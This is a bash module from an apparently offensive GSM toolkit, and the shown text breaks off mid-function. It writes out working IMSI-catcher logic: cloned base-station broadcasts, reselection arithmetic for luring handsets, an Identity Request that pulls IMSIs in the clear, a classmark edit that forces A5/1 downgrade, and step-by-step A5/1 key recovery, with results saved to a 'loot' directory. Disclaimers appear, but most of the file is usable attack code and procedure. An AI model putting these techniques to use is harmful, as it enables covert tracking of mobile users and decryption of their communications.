#!/usr/bin/env bash
# gsm attack — IMSI catcher logic, A5/1 downgrade, TMSI de-anonymisation, Kc recovery
#
# Honest split, and where the line currently falls.
#
# BUILT (a vector reports `status transmit-ready`). For each of the four
# vectors the module builds the COMPLETE octet set — layer 3 messages, LAPDm
# framing, the SCH information field, the classmark, the Cipher Mode Command —
# and the frame schedule a driver would walk: which TDMA frame, which multiframe
# offset, which logical channel, and which of the four bursts a 456-bit LAPDm
# block becomes. The channel map is checked against TS 45.002 tables 4 and 5,
# the burst layout against table 5.2.3-1, and the LAPDm header against TS 44.006
# — all in --selftest, against the table text rather than against this code.
#
# BUILT, AND ON THE AIR. `--transmit <arfcn>` closes the loop the earlier
# draft of this header admitted was open. It builds real System Information
# octets (SI1/SI2/SI3/SI4), puts them through the xCCH channel coder — FIRE
# CRC-40, the rate-1/2 K=5 convolutional code, the 456-bit interleave and the
# four 116-bit bursts — lays them into a 51-frame multiframe with genuine FCCH
# and SCH bursts, applies GMSK modulation, resamples to a rate a HackRF
# accepts, and calls hackrf_transfer. With no radio attached it exits 3 and
# names the device; it never prints a success line it did not earn.
#
# The transmit chain is asserted against an independent implementation, not
# against this module's own output: `tools/gsm_mod.py selftest` checks every
# coded vector against libosmocoding 1.7.0, and `tools/gsm_mod.py carrier
# --format cfile` writes a stream that gr-gsm's own receiver decodes back to
# the exact 23-octet blocks that went in, at the frame numbers they were
# placed at. What that does NOT prove is that a handset camps on the carrier;
# nobody has put this waveform on the air, and the BCCH LAPDm framing is an
# unverified reading of TS 44.006 5.2. `--transmit` prints both as limits.
#
# STILL HANDOFF (the four plan files report `status handoff`). Those files
# describe the whole attack, which is more than a broadcast carrier: they need
# a receiver running at the same time to catch the RACH, and an operator on
# licensed spectrum. --tx-ack prints the acknowledgement a driver takes before
# keying a transmitter. `written` is not `works`; see docs/HANDOFF.md.
#
# BUILT AND INDEPENDENT OF ANY RADIO. The RACH->AGCH->SDCCH sequence, the
# classmark codec, the paging arithmetic that predicts which CCCH block a given
# IMSI must listen on, and the A5/1 / A5/2 keystream and key search are
# performed for real and asserted against published vectors.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/gsm_attack"
GATK_DIR="$LOOT_DIR/gsm_attack"
mkdir -p "$MOD_TMP" "$GATK_DIR" 2>/dev/null

# Shared cross-module state — other modules read these.
GATK_SDR="${TMP_DIR}/sdr_device"
GATK_ARFCN="${TMP_DIR}/target_arfcn"
GATK_PLMN="${TMP_DIR}/target_plmn"

# ── sanitisation ────────────────────────────────────────────────────────
gatk_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# ── hex helpers (same contract as 06_gsm_air.sh) ────────────────────────
gatk_norm_hex() {
    printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'
}
gatk_is_hex() {
    local h; h=$(gatk_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
gatk_hex_to_bits() {
    local h; h=$(gatk_norm_hex "${1:-}")
    local i out=""
    for (( i = 0; i < ${#h}; i++ )); do
        case "${h:i:1}" in
            0) out+=0000 ;; 1) out+=0001 ;; 2) out+=0010 ;; 3) out+=0011 ;;
            4) out+=0100 ;; 5) out+=0101 ;; 6) out+=0110 ;; 7) out+=0111 ;;
            8) out+=1000 ;; 9) out+=1001 ;; a) out+=1010 ;; b) out+=1011 ;;
            c) out+=1100 ;; d) out+=1101 ;; e) out+=1110 ;; f) out+=1111 ;;
            *) return 1 ;;
        esac
    done
    printf '%s' "$out"
}
gatk_bits_to_hex() {
    local bits="${1:-}"
    while (( ${#bits} % 4 != 0 )); do bits+="0"; done
    local i nib out=""
    for (( i = 0; i < ${#bits}; i += 4 )); do
        nib="${bits:i:4}"
        case "$nib" in
            0000) out+="0" ;; 0001) out+="1" ;; 0010) out+="2" ;; 0011) out+="3" ;;
            0100) out+="4" ;; 0101) out+="5" ;; 0110) out+="6" ;; 0111) out+="7" ;;
            1000) out+="8" ;; 1001) out+="9" ;; 1010) out+="a" ;; 1011) out+="b" ;;
            1100) out+="c" ;; 1101) out+="d" ;; 1110) out+="e" ;; 1111) out+="f" ;;
            *) return 1 ;;
        esac
    done
    printf '%s' "$out"
}

# ── hardware guards ─────────────────────────────────────────────────────
# A transmitter is a different class of device from a receiver. An RTL-SDR
# cannot transmit at all, so it must never satisfy a transmit guard.
gatk_find_tx_sdr() {
    local d
    for d in hackrf bladerf usrp limesdr; do
        case "$d" in
            hackrf)  command -v hackrf_transfer  >/dev/null 2>&1 && { echo "hackrf";  return 0; } ;;
            bladerf) command -v bladeRF-cli      >/dev/null 2>&1 && { echo "bladerf"; return 0; } ;;
            usrp)    command -v uhd_siggen       >/dev/null 2>&1 && { echo "usrp"; return 0; } ;;
            limesdr) command -v LimeUtil         >/dev/null 2>&1 && { echo "limesdr"; return 0; } ;;
        esac
    done
    return 1
}

gatk_find_rx_sdr() {
    local d
    for d in hackrf bladerf limesdr usrp; do
        case "$d" in
            hackrf)  command -v hackrf_info     >/dev/null 2>&1 && { echo "hackrf";  return 0; } ;;
            bladerf) command -v bladeRF-cli     >/dev/null 2>&1 && { echo "bladerf"; return 0; } ;;
            limesdr) command -v LimeUtil        >/dev/null 2>&1 && { echo "limesdr"; return 0; } ;;
            usrp)    command -v uhd_find_devices >/dev/null 2>&1 && { echo "usrp"; return 0; } ;;
        esac
    done
    command -v rtl_test >/dev/null 2>&1 && { echo "rtlsdr"; return 0; }
    return 1
}

# gr-gsm provides the transmitter side (grgsm_livemon + the burst_sender
# flowgraphs); OsmocomBB needs a phone with the firmware loaded.
gatk_find_gsm_stack() {
    for t in grgsm_livemon grgsm_decode osmocon mobile; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

# The exact hardware each plan needs. Named, not implied.
gatk_required_hardware() {
    case "${1:-}" in
        imsi-catcher)
            echo "TX-capable SDR (HackRF One, BladeRF x40/x115, or USRP B200/B210) + gr-gsm (grgsm_livemon, burst_sender) or OsmocomBB on a Motorola C1xx/compal phone + a RX SDR to monitor the real BCCH" ;;
        a5-downgrade)
            echo "TX-capable SDR (HackRF/BladeRF/USRP) + gr-gsm burst_sender for the RAND/Authentication Request and Cipher Mode Command; a programmable SIM (sysmoUSIM/sysmocom or OsmocomBB) to observe the MS response" ;;
        tmsi-deanon)
            echo "TX-capable SDR (HackRF/BladeRF/USRP) + gr-gsm for the Identity Request on SDCCH; an RX SDR for the paging channel; optionally a USIM programmer to hold a known TMSI" ;;
        kc-recovery)
            echo "RX-capable SDR (RTL-SDR, HackRF, BladeRF, USRP) + gr-gsm or airprobe to capture the encrypted burst; 1.7 TB of A5/1 rainbow tables (or a GPU cluster) for the practical break" ;;
        *) echo "unknown plan" ;;
    esac
}

# ── plan files: status handoff, never a fake success ────────────────────
# A plan file is a TSV of KEY<TAB>VALUE lines with a status header. It is
# labelled a plan because the vector needs hardware this module cannot assume.
gatk_plan_path() { printf '%s/plan_%s.tsv' "$GATK_DIR" "${1:-}"; }

gatk_write_plan() {
    local name="${1:-}"
    case "$name" in
        imsi-catcher|a5-downgrade|tmsi-deanon|kc-recovery) ;;
        *) printf 'ERROR\tunknown plan: %s\n' "${name:-<none>}" >&2; return 2 ;;
    esac
    mkdir -p "$GATK_DIR" || {
        printf 'ERROR\tcannot create %s\n' "$GATK_DIR" >&2; return 1; }
    local f; f=$(gatk_plan_path "$name")
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    {
        printf 'status\thandoff\n'
        printf 'plan\t%s\n' "$name"
        printf 'written\t%s\n' "$ts"
        printf 'hardware\t%s\n' "$(gatk_required_hardware "$name")"
        printf 'tx_sdr_present\t%s\n' "$(gatk_find_tx_sdr || echo none)"
        printf 'rx_sdr_present\t%s\n' "$(gatk_find_rx_sdr || echo none)"
        printf 'gsm_stack_present\t%s\n' "$(gatk_find_gsm_stack || echo none)"
        gatk_plan_body "$name"
    } > "$f" || {
        printf 'ERROR\tcannot write plan file %s (permission denied?)\n' "$f" >&2
        return 1; }
    [[ -s "$f" ]] || {
        printf 'ERROR\tplan file %s is empty after write\n' "$f" >&2; return 1; }
    printf '%s\t%s\n' "$name" "$f"
    return 0
}

# The body of each plan: the real steps, in order, with the real parameters.
gatk_plan_body() {
    case "${1:-}" in
        imsi-catcher) cat <<'EOF'
objective	Capture the IMSI of every MS in the cell by impersonating a real base station
precondition	RX survey of the target cell completed (02_cell_recon.sh) so the ARFCN, BSIC, MCC/MNC, LAC and CI are known
step1	Park the RX SDR on the target ARFCN and record one full BCCH cycle: FCCH, SCH, BCCH with SI1/SI2/SI3/SI4/SI13. This yields the exact SI to clone.
step2	Build a fake BCCH on a free ARFCN with the same MCC/MNC/LAC/CI and a C1 value higher than the real cell. C1 = (A - max(B,0)) with A = RXLEV_ACCESS_MIN - RXLEV_AVG, B = MS_TXPWR_MAX_CCH - P. A higher C1 wins cell reselection (TS 45.008 section 6.4).
step3	Transmit the fake BCCH continuously. Neighbouring MSs reselect to it within one to three seconds (the reselection penalty timer).
step4	When an MS camps, page it (or wait for its Location Update) and answer the RACH with an Immediate Assignment on AGCH, granting an SDCCH.
step5	On the SDCCH, send IDENTITY REQUEST with identity type = IMSI BEFORE enabling ciphering. The MS replies IDENTITY RESPONSE carrying the IMSI in the clear.
step6	Optionally send a Cipher Mode Command with A5/0 and no authentication, then release the channel with a Location Update Reject so the MS returns to the real network without noticing.
timing_note	The whole exchange fits in one SDCCH transaction (about 0.5 to 1.5 s). A real network competing for the same MS will win if its C1 is higher, so the fake BCCH must be louder.
detection	The fake cell broadcasts no valid neighbour list, and an MS that logs cell history sees a new LAC/CI pair. A network-side audit sees no corresponding subscriber activity.
legal	Unauthorised transmission on licensed spectrum is illegal in every jurisdiction that has spectrum law. This is a plan for authorised research in a shielded enclosure or under an explicit licence.
EOF
            ;;
        a5-downgrade) cat <<'EOF'
objective	Force a target MS onto a weaker cipher (A5/0 or A5/2) so its traffic can be decrypted in real time
precondition	The MS is camped on the fake cell from the imsi-catcher plan, on a dedicated channel
step1	Observe the target MS classmark. A real network sends CLASSMARK ENQUIRY and the MS returns its Mobile Station Classmark 2, whose octet 1 bit 4 declares A5/1 support.
step2	Because the classmark is sent in the clear and is not integrity protected on GSM, it can be modified in flight. Clearing octet 1 bit 4 makes the MS advertise "no A5/1", after which the network is expected to fall back to A5/2 (TS 43.020 section 4.4).
step3	Send AUTHENTICATION REQUEST with a chosen RAND. Without the real Ki the SRES will not verify, so in practice the attacker sends a Cipher Mode Command with no preceding authentication. Many MSs accept it; those that do not reject with Cipher Mode Reject.
step4	Send CIPHER MODE COMMAND with the algorithm identifier in the Cipher Mode Setting IE: 000 for A5/0, 010 for A5/2. The MS begins ciphering with the requested algorithm.
step5	For A5/0 the keystream is all zeros: the traffic is plaintext. For A5/2 recover the key with the 16-bit-work factor attack (Briceno/Goldberg/Wagner, Crypto'99) and decrypt.
classmark_note	The downgrade rests entirely on the classmark being the only statement of cipher capability and being unauthenticated. This is the GSM design flaw, not an implementation bug.
detection	The MS logs Cipher Mode Reject if it refuses; a network that authenticated first will see no matching SRES.
legal	See the imsi-catcher plan: transmission on licensed spectrum requires authorisation.
EOF
            ;;
        tmsi-deanon) cat <<'EOF'
objective	Map a temporary identity (TMSI) observed on the air to the permanent IMSI behind it
precondition	A TMSI has been observed in a PAGING REQUEST on the target cell (or captured earlier)
step1	Record the TMSI from the PAGING REQUEST TYPE 1/2/3 on the PCH. The mobile identity IE type is 100 for a TMSI.
step2	Trigger a transaction that forces the network to ask the MS for its IMSI, or impersonate the network and send IDENTITY REQUEST with type = IMSI. The MS answers IDENTITY RESPONSE with the IMSI in the clear.
step3	Correlate the two: the Identity Response arrives on the SDCCH belonging to the same MS that was paged with that TMSI. The TMSI-to-IMSI mapping is now established.
step4	Optionally force a TMSI REALLOCATION COMMAND with a chosen TMSI so that the mapping is attacker-chosen and stable, making future correlation trivial.
paging_mapping	The paging block is selected by PAGING_GROUP = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) mod N, and the block index within that 51-multiframe is PAGING_GROUP mod (N div BS_PA_MFRMS), where N = paging blocks available per 51-multiframe x BS_PA_MFRMS (TS 45.002 sections 6.5.2 and 6.5.3). Given the IMSI recovered in step 2, compute the group and confirm it matches the block the PAGING REQUEST was observed in. A match confirms the correlation without any further transmission.
detection	The de-anonymisation requires an Identity Request that the real network did not send, so the MS sees an unexpected procedure.
legal	See the imsi-catcher plan.
EOF
            ;;
        kc-recovery) cat <<'EOF'
objective	Recover the 64-bit cipher key Kc from an A5/1-protected burst whose plaintext is known or guessable
background	The key is loaded into three LFSRs of 19, 22 and 23 bits; the state space is 2^64, effectively 2^54 because COMP128 forces the low 10 bits of Kc to zero.
method_a_two_known_plaintext	Briceno/Goldberg/Wagner 1998 attack, stated in terms of keystream from two frames. One frame yields 228 bits, not 114: A5/1 runs ONE 228-bit generator per frame with the downlink in bits 0..113 and the uplink in bits 114..227, so a single frame gives both directions. Two frames therefore means 456 bits. Cost is roughly 2^51 operations in the original formulation.
method_b_rainbow_tables	Nohl 2009. Sort 1.7 TB of precomputed tables on the 64-bit state. Two known plaintext frames are enough; lookup is seconds on a modern machine. This is the reason A5/1 is dead in practice.
method_c_ciphertext_only	Barkan/Biham/Keller 2003. Exploits GSM error-correction redundancy so known plaintext is not strictly needed; needs roughly 2 seconds of recorded traffic.
step1	Capture the encrypted burst with gr-gsm or airprobe on the target ARFCN and timeslot. Confirm the frame is a TCH/F or SDCCH/8 burst with the training sequence matching the serving cell's TSC.
step2	Obtain known plaintext. No call is needed to get the first 142 bits: a BTS fills every idle timeslot of C0 with the fixed dummy burst (TS 45.002 5.2.6), which is known plaintext that repeats for as long as the timeslot stays idle. A call adds the codec silence frame, the LAPDm fill frame (030301) and the SACCH System Information. See --dummy-burst.
step3	XOR the known plaintext with the ciphertext to recover the first keystream bits.
step4	Walk the rainbow tables (Kraken or a GPU implementation) keyed on the recovered keystream to obtain the 64-bit LFSR state.
step5	Clock the recovered state back to the start of the frame to obtain Kc, then decrypt every subsequent frame until the next re-key.
verification	Re-encrypt a later captured burst with the recovered Kc and check it matches byte for byte.
legal	Recording the radio spectrum and decrypting traffic you are not a party to is illegal in most jurisdictions.
EOF
            ;;
        *) return 1 ;;
    esac
}

gatk_cmd_plan() {
    local name="${1:-}"
    [[ -n "$name" ]] || {
        printf 'ERROR\tusage: --plan <imsi-catcher|a5-downgrade|tmsi-deanon|kc-recovery>\n' >&2
        return 2; }
    local out rc
    out=$(gatk_write_plan "$name"); rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tplan %s was not written (rc=%s)\n' "$name" "$rc" >&2
        return "$rc"
    fi
    printf 'plan\t%s\n' "$name"
    printf 'status\thandoff\n'
    printf 'file\t%s\n' "$(printf '%s' "$out" | cut -f2)"
    printf 'hardware\t%s\n' "$(gatk_required_hardware "$name")"
    return 0
}

gatk_cmd_plan_tsv() {
    local f
    for f in "$GATK_DIR"/plan_*.tsv; do
        [[ -f "$f" ]] || continue
        awk -F'\t' -v F="$f" '
            $1=="status"{s=$2} $1=="plan"{p=$2}
            END{printf "%s\t%s\t%s\n", p, s, F}' "$f"
    done
}

# ── IMSI catcher: the RACH -> AGCH -> SDCCH sequence (real construction) ─
# This is the channel sequence an IMSI catcher must drive. The message
# sequences are real TS 44.018 messages; we emit them as construction steps
# with the channel each rides on. Building the bit-level bursts for the radio
# is the handoff; deciding the sequence is not.
gatk_imsi_catcher_sequence() {
    cat <<'EOF'
step	channel	direction	message	message_type	purpose
1	BCCH	DL	SYSTEM INFORMATION TYPE 1	0x19	clone the cell allocation and RACH control parameters
2	BCCH	DL	SYSTEM INFORMATION TYPE 2	0x1a	clone the BCCH allocation (neighbour ARFCNs)
3	BCCH	DL	SYSTEM INFORMATION TYPE 3	0x1b	clone the identity: MCC, MNC, LAC, CI, T3212, control channel description
4	BCCH	DL	SYSTEM INFORMATION TYPE 4	0x1c	clone the LAC/CI and CBCH description
5	BCCH	DL	SYSTEM INFORMATION TYPE 13	0x04	clone the GPRS cell options so GPRS-capable MSs camp
6	RACH	UL	CHANNEL REQUEST	0x0c	the MS asks for a channel; 8 bits of random reference plus the establishment cause
7	AGCH	DL	IMMEDIATE ASSIGNMENT	0x3f	grant an SDCCH/4 sub-channel (the combined configuration this vector clones) and a timing advance
8	SDCCH	DL	PAGING REQUEST TYPE 1	0x21	optional: page the target by TMSI to make it answer on the assigned channel
9	SDCCH	UL	PAGING RESPONSE	0x27	the MS identifies itself with its TMSI
10	SDCCH	UL	CM SERVICE REQUEST	0x24	alternative path: the MS requests a service and sends its identity
11	SDCCH	DL	IDENTITY REQUEST	0x05	ask for the IMSI explicitly, identity type = 001
12	SDCCH	UL	IDENTITY RESPONSE	0x06	the MS returns its IMSI in the clear - the objective
13	SDCCH	DL	CIPHER MODE COMMAND	0x35	optional: switch on A5/0 so the exchange is plaintext anyway
14	SDCCH	DL	CHANNEL RELEASE	0x0d	release so the MS returns to the real network
EOF
}

gatk_cmd_imsi_catcher_sequence() {
    gatk_imsi_catcher_sequence
}

# ── the paging-response race, in frames ─────────────────────────────────
# When both the real network and the fake cell page the same MS, the MS
# answers whoever it hears first with a valid paging block assignment. The
# race is decided in TDMA frames, so the attacker needs to be a few frames
# ahead. One 51-frame multiframe is 51 * 4.615 ms = 235.4 ms.
GATK_FRAME_MS="4.615"     # one TDMA frame, milliseconds
GATK_MF_FRAMES="51"       # frames per 51-multiframe (CCCH)

gatk_paging_race() {
    local lead="${1:-3}"
    [[ "$lead" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tlead must be a whole number of frames\n' >&2; return 2; }
    awk -v lead="$lead" -v fm="$GATK_FRAME_MS" -v mf="$GATK_MF_FRAMES" 'BEGIN{
        printf "tdma_frame_ms\t%.3f\n", fm
        printf "multiframe_frames\t%d\n", mf
        printf "multiframe_ms\t%.1f\n", fm * mf
        printf "attacker_lead_frames\t%d\n", lead
        printf "attacker_lead_ms\t%.2f\n", fm * lead
        printf "paging_block_period_ms\t%.1f\n", fm * mf
        # The MS answers the first valid assignment it decodes. A lead of one
        # frame is enough to win the decode race; three frames covers the
        # propagation and processing jitter of a typical handset.
        printf "race_window_frames\t%d\n", 1
        printf "verdict\t%s\n", (lead >= 1 ? "attacker can win the decode race if it is decoded first" : "attacker loses: the real network is decoded first")
    }'
}

# ── C1 reselection arithmetic (real) ────────────────────────────────────
# TS 45.008 section 6.4: C1 = (A - max(B, 0)) where
#   A = RXLEV_ACCESS_MIN - RXLEV_AVG          (both in dBm)
#   B = MS_TXPWR_MAX_CCH - P                  (both in dBm)
# A cell is selectable only if C1 > 0. A fake cell wins reselection if its
# C1 exceeds the serving cell's C1 for the 5-second reselection timer.
gatk_c1() {
    local rxlev_access_min="${1:-}" rxlev_avg="${2:-}" ms_txpwr_max="${3:-}" p="${4:-}"
    [[ "$rxlev_access_min" =~ ^-?[0-9]+$ && "$rxlev_avg" =~ ^-?[0-9]+$ &&
       "$ms_txpwr_max" =~ ^-?[0-9]+$ && "$p" =~ ^-?[0-9]+$ ]] || {
        printf 'ERROR\tC1 needs four dBm integers: RXLEV_ACCESS_MIN RXLEV_AVG MS_TXPWR_MAX_CCH P\n' >&2
        return 2; }
    awk -v ram="$rxlev_access_min" -v ra="$rxlev_avg" \
        -v mt="$ms_txpwr_max" -v p="$p" 'BEGIN{
        A = ram - ra
        B = mt - p
        b2 = (B > 0) ? B : 0
        C1 = A - b2
        printf "A_dbm\t%d\n", A
        printf "B_dbm\t%d\n", B
        printf "C1_dbm\t%d\n", C1
        printf "selectable\t%s\n", (C1 > 0 ? "yes" : "no")
    }'
}

# ── classmark encoder (real, byte-exact) ────────────────────────────────
# Mobile Station Classmark 2, TS 24.008 section 10.5.1.6, figure 10.5.6.
# The IE is five octets: IEI 0x33, a length of 3, then three content octets.
# Figure 10.5.6 numbers the bits 8..1 left to right, and bit 1 is the LSB:
#
#   octet 3:  0 | Revision(2) | ES IND | A5/1 | RF power capability(3)
#   octet 4:  0 | PS capa | SS Screening Ind(2) | SM ca. | VBS | VGCS | FC
#   octet 5:  CM3 | 0 | LCSVA CAP | UCS2 | SoLSA | CMSP | A5/3 | A5/2
#
# CORRECTED against the figure. This encoder previously put revision and RF
# power capability where each other belongs, ES IND one bit low, PS
# capability in the wrong octet, FC at bit 8 instead of bit 1, and spread
# Classmark 2 octet 5 across three octets. Every earlier assertion passed
# because the decoder mirrored the encoder: a self-consistent pair proves
# only that the arithmetic round-trips, not that the bits are where the
# network will look for them.
#
# A5/1 is INVERTED: bit 4 clear means A5/1 available, set means not
# available. A5/4..A5/7 are Classmark 3 fields and are refused here rather
# than silently dropped; `vbs` is likewise not a Classmark 2 field.
gatk_classmark_encode() {
    local revision="${1:-3}" es_ind="${2:-0}" a51="${3:-1}" rfpow="${4:-3}"
    local ss_screen="${5:-1}" sm_cap="${6:-1}" vbs="${7:-0}" vgcs="${8:-0}"
    local vbs_notif="${9:-0}" fc="${10:-0}" cm3="${11:-0}" lcs="${12:-0}"
    local ps="${13:-1}" a52="${14:-0}" a53="${15:-0}" a54="${16:-0}"
    local a55="${17:-0}" a56="${18:-0}" a57="${19:-0}" cmsp="${20:-0}"
    local so_lsa="${21:-0}" ucs2="${22:-0}"

    local n
    for n in "$revision" "$es_ind" "$a51" "$rfpow" "$ss_screen" "$sm_cap" \
             "$vbs" "$vgcs" "$vbs_notif" "$fc" "$cm3" "$lcs" "$ps" \
             "$a52" "$a53" "$a54" "$a55" "$a56" "$a57" "$cmsp" \
             "$so_lsa" "$ucs2"; do
        [[ "$n" =~ ^[0-9]+$ ]] || {
            printf 'ERROR\tclassmark fields must be integers\n' >&2; return 2; }
    done
    (( revision <= 3 && rfpow <= 7 && ss_screen <= 3 )) || {
        printf 'ERROR\trevision<=3, rfpow<=7, ss_screen<=3\n' >&2; return 2; }
    # Fields that exist but do not belong in this information element. Say so
    # rather than accept them and emit nothing, which is how a wrong octet
    # travels unnoticed all the way to a handset.
    (( (a54 | a55 | a56 | a57) == 0 )) || {
        printf 'ERROR\tA5/4..A5/7 are Classmark 3 fields; Classmark 2 cannot carry them\n' >&2
        return 2; }
    (( vbs == 0 )) || {
        printf 'ERROR\t"VBS capability" is not a Classmark 2 field; classmark 2 carries VBS *notification reception* (arg 9)\n' >&2
        return 2; }

    local o3 o4 o5
    o3=$(( ((revision & 3) << 5) | ((es_ind & 1) << 4) | ((a51 & 1) << 3) | (rfpow & 7) ))
    o4=$(( ((ps & 1) << 6) | ((ss_screen & 3) << 4) | ((sm_cap & 1) << 3) \
         | ((vbs_notif & 1) << 2) | ((vgcs & 1) << 1) | (fc & 1) ))
    o5=$(( ((cm3 & 1) << 7) | ((lcs & 1) << 5) | ((ucs2 & 1) << 4) \
         | ((so_lsa & 1) << 3) | ((cmsp & 1) << 2) | ((a53 & 1) << 1) | (a52 & 1) ))
    printf '33%02x%02x%02x%02x' 3 "$(( o3 & 0xff ))" "$(( o4 & 0xff ))" "$(( o5 & 0xff ))"
}

# Decode a Classmark 2 IE back into its fields, reading figure 10.5.6's bit
# positions. The IEI is checked, so a Classmark 1 value octet handed to this
# function is rejected instead of being decoded as a classmark 2.
gatk_classmark_decode() {
    local hex; hex=$(gatk_norm_hex "${1:-}")
    [[ "$hex" =~ ^[0-9a-f]{10}$ ]] || {
        printf 'ERROR\tclassmark must be 5 octets of hex (10 digits)\n' >&2; return 2; }
    local iei=$(( 16#${hex:0:2} )) len=$(( 16#${hex:2:2} ))
    local o3=$(( 16#${hex:4:2} )) o4=$(( 16#${hex:6:2} )) o5=$(( 16#${hex:8:2} ))
    (( iei == 0x33 )) || {
        printf 'ERROR\tnot a Mobile Station Classmark 2 IE: IEI 0x%02x, expected 0x33\n' "$iei" >&2
        return 2; }
    local a51bit=$(( (o3 >> 3) & 1 ))
    printf 'iei\t%02x\n'       "$iei"
    printf 'length\t%d\n'      "$len"
    printf 'revision\t%d\n'    "$(( (o3 >> 5) & 3 ))"
    printf 'es_ind\t%d\n'      "$(( (o3 >> 4) & 1 ))"
    printf 'a5_1\t%d\n'        "$a51bit"
    printf 'a5_1_available\t%s\n' "$([[ $a51bit -eq 0 ]] && echo yes || echo no)"
    printf 'rf_power\t%d\n'    "$(( o3 & 7 ))"
    printf 'ps\t%d\n'          "$(( (o4 >> 6) & 1 ))"
    printf 'ss_screen\t%d\n'   "$(( (o4 >> 4) & 3 ))"
    printf 'sm_cap\t%d\n'      "$(( (o4 >> 3) & 1 ))"
    printf 'vbs_notif\t%d\n'   "$(( (o4 >> 2) & 1 ))"
    printf 'vgcs\t%d\n'        "$(( (o4 >> 1) & 1 ))"
    printf 'fc\t%d\n'          "$(( o4 & 1 ))"
    printf 'cm3\t%d\n'         "$(( (o5 >> 7) & 1 ))"
    printf 'lcs\t%d\n'         "$(( (o5 >> 5) & 1 ))"
    printf 'ucs2\t%d\n'        "$(( (o5 >> 4) & 1 ))"
    printf 'so_lsa\t%d\n'      "$(( (o5 >> 3) & 1 ))"
    printf 'cmsp\t%d\n'        "$(( (o5 >> 2) & 1 ))"
    printf 'a5_3\t%d\n'        "$(( (o5 >> 1) & 1 ))"
    printf 'a5_2\t%d\n'        "$(( o5 & 1 ))"
    return 0
}

gatk_cmd_classmark() {
    local hex="${1:-}"
    if [[ -z "$hex" ]]; then
        # No argument: emit the default encoder output.
        local cm; cm=$(gatk_classmark_encode) || return 1
        printf 'classmark\t%s\n' "$cm"
        gatk_classmark_decode "$cm"
        return 0
    fi
    gatk_classmark_decode "$hex"
}

# The downgrade edit: make the ME advertise that A5/1 is unavailable.
# TS 24.008 10.5.1.5/10.5.1.6: A5/1 algorithm supported (bit 4)
#   0 = encryption algorithm A5/1 available
#   1 = encryption algorithm A5/1 not available
# So the downgrade SETS the bit. The original cleared it, which advertises
# A5/1 as *available* — the exact opposite of the operation's name.
gatk_classmark_downgrade() {
    local hex; hex=$(gatk_norm_hex "${1:-}")
    [[ "$hex" =~ ^[0-9a-f]{10}$ ]] || {
        printf 'ERROR\tclassmark must be 5 octets of hex (10 digits)\n' >&2; return 2; }
    (( 16#${hex:0:2} == 0x33 )) || {
        printf 'ERROR\tnot a Mobile Station Classmark 2 IE: IEI 0x%s, expected 0x33\n' \
            "${hex:0:2}" >&2; return 2; }
    local o3=$(( 16#${hex:4:2} ))
    local new_o3=$(( o3 | 8 ))          # octet 3 bit 4 = A5/1 not available
    printf 'before\t%s\n' "$hex"
    printf 'after\t%s%02x%s\n' "${hex:0:4}" "$new_o3" "${hex:6}"
    printf 'cleared_field\ta5_1\n'
    printf 'was\t%s\n' "$([[ $(( (o3 >> 3) & 1 )) -eq 1 ]] && echo 'A5/1 not available' || echo 'A5/1 available')"
    printf 'now\t%s\n' "$([[ $(( (new_o3 >> 3) & 1 )) -eq 1 ]] && echo 'A5/1 not available' || echo 'A5/1 available')"
    printf 'changed\t%s\n' "$([[ "$o3" != "$new_o3" ]] && echo yes || echo no)"
    printf 'changed_note\t%s\n' "$([[ "$o3" != "$new_o3" ]] && echo 'the A5/1 bit was set' || echo 'already advertised as unavailable; nothing to do')"
}

# ── Identity Request construction (real bytes) ──────────────────────────
# IDENTITY REQUEST, TS 44.018 section 9.1.15 / 10.5.2.20. RR message:
#   octet 1: skip indicator (bits 5-8) | protocol discriminator (bits 1-4)
#            -> 0x06 for Radio Resources (TS 24.007 11.2.3.1; 0x05 is MM)
#   octet 2: message type = 0x05 (IDENTITY REQUEST)
#   octet 3: identity type. In TS 44.018 the "Mobile Identity" IE here is a
#            4-bit "type of identity" followed by 4 spare bits:
#              001 IMSI, 010 IMEI, 011 IMEI+SVM, 100 TMSI
#            transmitted as the low nibble = type, high nibble = spare (0).
gatk_build_identity_request() {
    local type="${1:-1}"
    [[ "$type" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tidentity type must be an integer 1..4\n' >&2; return 2; }
    (( type >= 1 && type <= 4 )) || {
        printf 'ERROR\tidentity type %s out of range (1=IMSI 2=IMEI 3=IMEISV 4=TMSI)\n' "$type" >&2
        return 2; }
    # octet 3: low nibble carries the type, high nibble is spare.
    local o3=$(( type & 0x0f ))
